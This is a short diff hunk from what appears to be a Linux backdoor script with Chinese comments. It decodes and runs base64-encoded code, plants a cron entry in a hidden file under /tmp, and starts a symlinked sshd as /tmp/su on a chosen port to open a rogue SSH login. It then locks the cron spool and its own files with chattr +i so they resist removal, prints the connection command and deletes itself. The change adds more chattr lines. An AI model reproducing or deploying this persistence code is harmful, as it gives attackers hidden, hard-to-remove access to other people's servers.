@@ -153,11 +153,13 @@ decoded_bytes = base64_decode(encoded_string)
 run_code(decoded_bytes)
         """
     file_path = "/tmp/.11"
+    user = ml('whoami').strip()
     etc_crontab(shell, file_path)
     ml('ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=' + str(port))
+    ml('chattr +i /var/spool/cron/' + user)
+    ml('chattr +i /var/spool/cron/crontabs')
     ml('chattr +i /var/spool/cron/')
     ml('chattr +i ' + file_path)
     ml('chattr +i /tmp/su')
-    user = ml('whoami').strip()
     print('------>连接命令为:ssh ' + str(user) + '@ip -p ' + str(port) + '<------')
     delete_current_script()  # 删除当前执行脚本文件
